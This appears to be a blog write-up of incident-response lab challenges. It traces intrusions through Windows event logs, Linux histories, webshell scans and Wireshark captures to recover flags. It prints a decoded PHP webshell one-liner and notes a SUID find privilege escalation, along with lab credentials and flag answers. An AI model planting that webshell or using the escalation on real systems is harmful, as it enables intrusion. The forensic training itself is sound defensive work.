<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-4"><a href="#任务五-4" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</span><br></pre></td></tr></table></figure>

<p>直接就是扫一下就行，就能发现</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/1962cab0827eb55feaf69158d0e7f6ae--2ee5--image-20240607153825990.png" alt="image-20240607153825990"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务六"><a href="#任务六" class="headerlink" title="任务六"></a>任务六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag&#123;1.exe&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/08e7ef1309b797d696594cd967d64b51--a38e--image-20240607154234119.png" alt="image-20240607154234119"></p>
<p>这里主要是注意看修改日期，就能很明显发现这两个文件</p>
<p>而且bat文件内容就是启动那个exe，就很明显就能感觉出来是黑客留下的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>

<h2 id="黑页-篡改"><a href="#黑页-篡改" class="headerlink" title="黑页&amp;&amp;篡改"></a>黑页&amp;&amp;篡改</h2><p>开放类题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请启动 phpstudy 后访问 127.0.0.1</span><br><span class="line">具体要求已经在桌面 readme.png 本题为开放式题目，请访问 http://127.0.0.1/dedecms/index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/9f5087d42372f2244c86dba5ecde3dbc--a583--image-20240607165458525.png" alt="image-20240607165458525"></p>
<h4 id="任务一-10"><a href="#任务一-10" class="headerlink" title="任务一"></a>任务一</h4><p>第一种就很简单的单纯添加html代码而已，删除即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/59f0fc6648fa379b077b2d1075b1610c--47a9--image-20240607165442183.png" alt="image-20240607165442183"></p>
<h4 id="任务二-9"><a href="#任务二-9" class="headerlink" title="任务二"></a>任务二</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/6887818e4c12c222db374dc9619a8d35--85c0--image-20240607165935228.png" alt="image-20240607165935228"></p>
<h4 id="任务三-9"><a href="#任务三-9" class="headerlink" title="任务三"></a>任务三</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/1790e65167eb1e3c38d84a9eb138b84d--5d58--image-20240607170104646.png" alt="image-20240607170104646"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/5190e8675a066d5312ba1b6a12e76dfa--ff78--image-20240607170053639.png" alt="image-20240607170053639"></p>
<p>1.js</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/23ee3d817db6697162b7406d6b5ec8e7--9768--image-20240607170331722.png" alt="image-20240607170331722"></p>
<h4 id="任务四-9"><a href="#任务四-9" class="headerlink" title="任务四"></a>任务四</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/f7a734496dc1b62649fdfbe75ba6b1d4--a99f--image-20240607170316227.png" alt="image-20240607170316227"></p>
<h4 id="任务五-5"><a href="#任务五-5" class="headerlink" title="任务五"></a>任务五</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/d542768c05edb59f0e430e618fd1e051--3ed2--image-20240607170350816.png" alt="image-20240607170350816"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/6c4271836480a8fdcdee5f4cdafa562e--e949--image-20240607170415685.png" alt="image-20240607170415685"></p>
<h1 id="第五章-linux实战"><a href="#第五章-linux实战" class="headerlink" title="第五章-linux实战"></a>第五章-linux实战</h1><h2 id="Windows-实战-evtx-文件分析"><a href="#Windows-实战-evtx-文件分析" class="headerlink" title="Windows 实战-evtx 文件分析"></a>Windows 实战-evtx 文件分析</h2><h4 id="任务一-11"><a href="#任务一-11" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将黑客成功登录系统所使用的IP地址作为Flag值提交；</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.36.133&#125;</span><br></pre></td></tr></table></figure>

<p>筛选安全日志4624，登录成功，找最早登录的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/789b239a393078b146d31452deb1381c--3380--image-20240608211122498.png" alt="image-20240608211122498"></p>
<p>使用日志分析工具，筛选远程登录即可快速找到</p>
<h4 id="任务二-10"><a href="#任务二-10" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Adnimistartro&#125;</span><br></pre></td></tr></table></figure>

<p>主要就是找用户登录的日志即可</p>
<p>筛选安全日志4781，账户名称已更改</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/c87f0e6fdd7623ecf96ed094dccc791a--81ad--image-20240608213752997.png" alt="image-20240608213752997"></p>
<p>使用事件id能够更快的去分析</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/d8913a3327f68cad8a53798b7e49e544--c04c--image-20240608212250620.png" alt="image-20240608212250620"></p>
<p>里面混了一个这不一样的</p>
<h4 id="任务三-10"><a href="#任务三-10" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMA</span><br></pre></td></tr></table></figure>

<p>筛选安全日志4663，尝试访问对象	检测未经授权访问文件和文件夹的行为</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/b70999143b396ba6cc0ea78373df1b77--d89f--image-20240608213623215.png" alt="image-20240608213623215"></p>
<h4 id="任务四-10"><a href="#任务四-10" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；</span><br></pre></td></tr></table></figure>

<p>根据上述黑客攻击的时间段，为2020年10月8日 筛选应用程序日志记录时间为2020年10月8日，来事件源为MySQL</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/773c399f7c6d0f4b468cc145d4cfad9e--9277--image-20240608214745960.png" alt="image-20240608214745960"></p>
<p>然后再搜索start找到最后一次启动mysql</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/954d96fe2e07e030f079c85de7700b57--1fb4--image-20240608214808719.png" alt="image-20240608214808719"></p>
<p>flag{8820}</p>
<h4 id="任务五-6"><a href="#任务五-6" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。xxxxxxxxxx 5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。</span><br></pre></td></tr></table></figure>

<p>筛选系统日志1074，计算机开机、关机、重启的时间、原因、注释</p>
<p>计算机为WIN-B1B1T3K57G9</p>
<p>CTRL+F 搜索Administratro，找对成对的记录，2次重启，1次关机</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/82df434b76f042e17fa2e451ad457725--0ad8--image-20240608215308905.png" alt="image-20240608215308905"></p>
<p>也就是三对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3&#125;</span><br></pre></td></tr></table></figure>

<h2 id="linux实战-挖矿"><a href="#linux实战-挖矿" class="headerlink" title="linux实战-挖矿"></a>linux实战-挖矿</h2><h4 id="任务一-12"><a href="#任务一-12" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客的IP是？ flag格式：flag&#123;黑客的ip地址&#125;，如：flag&#123;127.0.0.1&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是查看日志即可，全都是黑客的ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/admin/websec_80/log/nginx_access_2023-12-22.log</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.10.135&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-11"><a href="#任务二-11" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客攻陷网站的具体时间是？ flag格式：flag&#123;年-月-日 时:分:秒&#125;，如：flag&#123;2023-12-24 22:23:24&#125;</span><br></pre></td></tr></table></figure>

<p>dedecms弱口令进入后台：<a href="http://43.192.51.123:8081/dede/login.php?gotopage=/dede/">http://43.192.51.123:8081/dede/login.php?gotopage=%2Fdede%2F</a></p>
<p>这里可以通过日志去看出来，密码可以爆破一下即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin    12345678</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/ffe0ac99a34217da0e4dcf771b77c245--e63c--image-20240610134100632.png" alt="image-20240610134100632"></p>
<p>在账号处发现黑客的用户</p>
<p>即可知道对应的时间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023-12-22 19:08:34&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-11"><a href="#任务三-11" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客上传webshell的名称及密码是？ flag格式：flag&#123;黑客上传的webshell名称-webshell密码&#125;，如：flag&#123;webshell.php-pass&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是将网站源码push下来使用d盾去扫描一下</p>
<p>直接就能有了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a93fe2d838ff17c84e8d9b1bae653ef2--7363--image-20240610140120996.png" alt="image-20240610140120996"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a5e7da53acd4c883bc5778726e753ca0--9166--image-20240610140148993.png" alt="image-20240610140148993"></p>
<p>本地跑一下这一段即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(20) &quot;eval($_POST[&#x27;cmd&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;404.php-cmd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-11"><a href="#任务四-11" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客提权后设置的后门文件名称是？ flag格式：flag&#123;后门文件绝对路径加上名称&#125;，如：flag&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>

<p>直接使用history命令查看历史命令执行</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/f4986b2bc6d72d8634948ccf456b8007--7a1d--image-20240610135029337.png" alt="image-20240610135029337"></p>
<p>发现是使用了suid提权find命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/usr/bin/find&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-7"><a href="#任务五-7" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对黑客上传的挖矿病毒进行分析，获取隐藏的Flag</span><br></pre></td></tr></table></figure>

<p>挖矿病毒的话一般情况都是计划任务中定时执行，我们就去查看一下计划任务</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/6f8f04b805135fadd166d5b361a99ac0--a514--image-20240610135737910.png" alt="image-20240610135737910"></p>
<p>发现下载了一个ldm估计就是挖矿程序了</p>
<p>查找一下</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a9a779b045aa7bc68764a75b153e94cf--dab2--image-20240610135810644.png" alt="image-20240610135810644"></p>
<p>看到很明显的base64编码</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/ccdc5a343929cbf9d186e9224e0fd139--6ea5--image-20240610135903751.png" alt="image-20240610135903751"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/db4d266e8ba5c5650817e1e597e2e234--c9cb--image-20240610135942248.png" alt="image-20240610135942248"></p>
<p>解码成功获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;websec_True@888!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="linux实战-挖矿-二"><a href="#linux实战-挖矿-二" class="headerlink" title="linux实战-挖矿 二"></a>linux实战-挖矿 二</h2><p>百度网盘附件，下的贼慢</p>
<h2 id="linux实战-CMS01"><a href="#linux实战-CMS01" class="headerlink" title="linux实战-CMS01"></a>linux实战-CMS01</h2><h4 id="任务一-13"><a href="#任务一-13" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>直接就是查看最近的登录日志即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/030803d92fe4fb1af15067cb2a4e416b--01fa--image-20240611202335297.png" alt="image-20240611202335297"></p>
<p>即可得知黑客的ip是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.20.1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-12"><a href="#任务二-12" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客修改的管理员密码(明文)为多少,将黑客修改的管理员密码(明文) 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>我们首先就是可以去查看一下有哪些服务运行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anlupt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/1ea770786533a9acc850a125a6e28671--71f8--image-20240611202954349.png" alt="image-20240611202954349"></p>
<p>发现mysql服务，这个时候我们就可以去寻找一下mysql的配置文件拿到账号密码</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/a43857bfc91d13c59f6ba9964b4eda01--2a57--image-20240611203209610.png" alt="image-20240611203209610"></p>
<p>成功找到对应的账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/wwwroot/127.0.0.1/lib/config.inc.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kaoshi 5Sx8mK5ieyLPb84m</span><br></pre></td></tr></table></figure>

<p>然后就可以去连接mysql数据库</p>
<p>去查询</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/41cf245043261c63da29016311d8286b--2445--image-20240611203950735.png" alt="image-20240611203950735"></p>
<p>发现id为1的为管理员</p>
<p>然后就是再去查询用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from x2_user</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/8db50c668863c8efed04fbecf433bf35--c0cd--image-20240611204045800.png"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/2d21c3ba1feb1f92c405cf801ef02d00--84d9--image-20240611204250756.png" alt="image-20240611204250756"></p>
<p>成功拿到明文密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里推荐一个md5解密的网站，https://www.chamd5.org/</span><br><span class="line">比cmd5好用不少，主要是不用会员啥的</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Network@2020</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Network@2020&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-12"><a href="#任务三-12" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客第一次Webshell的连接URL为多少,将黑客第一次Webshell的连接URL作为 FLAG 提交(无需域名flag&#123;xxx.php?abc-app-upload&#125;);</span><br></pre></td></tr></table></figure>

<p>在root目录下发现了有数据包，我们就可以使用wireshark去分析一下</p>
<p>直接就是能够发现连接的URL</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/8e418260cd13c3f85a66c69f03ffe40a--42db--image-20240611205455562.png" alt="image-20240611205455562"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;index.php?user-app-register&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-12"><a href="#任务四-12" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客Webshell连接密码多少,将黑客Webshell连接密码 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>直接就是追踪流，发现</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/2e9728879ae6432bc318de2ad15c17cf--acfb--image-20240611205832288.png" alt="image-20240611205832288"></p>
<p>解码一下，得到对应的代码</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/e07df31824831bd5fe3ad4d77ac1b929--2974--image-20240611205855950.png" alt="image-20240611205855950"></p>
<p>分析可以发现是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);这段代码基本是所有WebShell客户端链接PHP类</span><br></pre></td></tr></table></figure>

<p>所以就是可以知道密码就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Network2020</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Network2020&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-8"><a href="#任务五-8" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客使用的后续上传的木马文件名称为多少,将黑客使用的后续上传的木马文件名称 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>就在流量分析界面很容易能够发现就是version2.php这个文件</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/55db29fbf9f30be4a6a065d17fbb87e7--e074--image-20240611210621885.png" alt="image-20240611210621885"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;version2.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务六-1"><a href="#任务六-1" class="headerlink" title="任务六"></a>任务六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客隐藏的flag2,将黑客使隐藏的flag2 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>梳理一下前面的内容</p>
<p>攻击在<code>/www/wwwroot/127.0.0.1/</code>目录下创建了<code>flag1</code> 文件并写入flag，然后写入一个新的木马，再改名为<code>version2.php</code></p>
<p>这里我们猜测就是上传木马后去getshell了，我们可以使用history查看一下命令执行</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/7a0f175ce4e9658d05cdfae0e5c500dc--b780--image-20240611212251131.png" alt="image-20240611212251131"></p>
<p>发信应该就是在mpnotify.php中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /www/wwwroot/127.0.0.1/.api/alinotify.php</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/91b74a52023726921803dd184dd2037f--adf1--image-20240611212454084.png" alt="image-20240611212454084"></p>
<p>成功拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务七"><a href="#任务七" class="headerlink" title="任务七"></a>任务七</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客隐藏的flag3,将黑客使隐藏的flag3 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>刚刚上面也是直接看到了的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span><br></pre></td></tr></table></figure>

<h2 id="linux实战-黑链"><a href="#linux实战-黑链" class="headerlink" title="linux实战-黑链"></a>linux实战-黑链</h2><h4 id="任务一-14"><a href="#任务一-14" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到黑链添加在哪个文件 flag 格式 flag&#123;xxx.xxx&#125;</span><br></pre></td></tr></table></figure>

<p>直接将文件下载下来，使用文本搜索关键字“黑链”很快就能找到</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/f63bafc48539d221ae1355b4a9f67525--b75a--image-20240612155110934.png" alt="image-20240612155110934"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;header.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-13"><a href="#任务二-13" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell的绝对路径 flag&#123;xxxx/xxx/xxx/xxx/&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是使用D盾去扫描一下即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/e959989a679f44300ac08580e0652413--2919--image-20240612155247623.png" alt="image-20240612155247623"></p>
<p>后门也就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\var\www\html\usr\themes\default\404.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/www/html/usr/themes/default/404.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-13"><a href="#任务三-13" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客注入黑链文件的 md5 md5sum file flag&#123;md5&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是使用md5sum即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/3f127ad880c5d32a643ebd005b0e4562--5307--image-20240612155646368.png" alt="image-20240612155646368"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10c18029294fdec7b6ddab76d9367c14</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;10c18029294fdec7b6ddab76d9367c14&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-13"><a href="#任务四-13" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击入口是哪里？url请求路径，最后面加/ flag&#123;/xxxx.xxx/xxxx/x/&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话我们就可以尝试去对数据包进行流量分析</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/98da58ad87d433f4bed428f02d18bffc--e0eb--image-20240612160018499.png" alt="image-20240612160018499"></p>
<p>发现这里去加载poc1.js</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/622a232085200d6f927500fc7e56582b--4b2a--image-20240612160057491.png" alt="image-20240612160057491"></p>
<p>我们能够很容易发现是xss漏洞，查找一番发现是typecho的对应漏洞</p>
<p><a href="https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html">Typecho1.2 - 1.2.1-rc前台评论存储xss到rce 漏洞复现-分析-修复 - JunBlog</a></p>
<p>这里我们也就知道了对应的路径了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/7e1969627573a3ee0e64f7855dd279fb--3cf6--image-20240612160242078.png" alt="image-20240612160242078"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/index.php/archives/1/&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第六章-流量特征分析"><a href="#第六章-流量特征分析" class="headerlink" title="第六章 流量特征分析"></a>第六章 流量特征分析</h1><h2 id="蚁剑流量分析"><a href="#蚁剑流量分析" class="headerlink" title="蚁剑流量分析"></a>蚁剑流量分析</h2><h4 id="任务一-15"><a href="#任务一-15" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.木马的连接密码是多少</span><br></pre></td></tr></table></figure>

<p>发现附件是一个流量包，我们直接使用Wireshark去分析即可</p>
<p>首先就是找连接密码，这个肯定就是http请求的相关</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;200&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/fa686be7307f55519c405bd10a532143--9b22--image-20240614160321164.png" alt="image-20240614160321164"></p>
<p>直接就是能够发现是蚁剑的流量</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/b5f9123c512a6a573269586b13b65aab--af17--image-20240614162932648.png" alt="image-20240614162932648"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-14"><a href="#任务二-14" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.黑客执行的第一个命令是什么</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/d0fa5b080c7d387b50f8f1987d6904d8--c9d0--image-20240614171146710.png" alt="image-20240614171146710"></p>
<p>点击显示分组字节</p>
<p>然后使用base64解密即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/bd5edf7004743dae03c953373eaf7618--0673--image-20240614171048945.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;id&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-14"><a href="#任务三-14" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.黑客读取了哪个文件的内容，提交文件绝对路径</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/25b1bc643eaafd747fe9edb9a26a4378--668a--image-20240614173147960.png" alt="image-20240614173147960"></p>
<p>第三个http请求包中即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-14"><a href="#任务四-14" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客上传了什么文件到服务器，提交文件名</span><br></pre></td></tr></table></figure>

<p>第四个请求包</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/69277f04d9978a2b5dd7fface608598b--6f62--image-20240614175654256.png" alt="image-20240614175654256"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;flag.txt&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-9"><a href="#任务五-9" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客上传的文件内容是什么</span><br></pre></td></tr></table></figure>

<p>直接就还是第四个http包，跟踪一下http流即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/a3a668d939eef0e96b6cf73002e8e1d0--b87c--image-20240614180642326.png" alt="image-20240614180642326"></p>
<p>将数据包解码一下</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/24a4490ab1b9890dacb25da9cfd51b6a--23e4--image-20240614180835252.png" alt="image-20240614180835252"></p>
<p>猜测这一串就是数据</p>
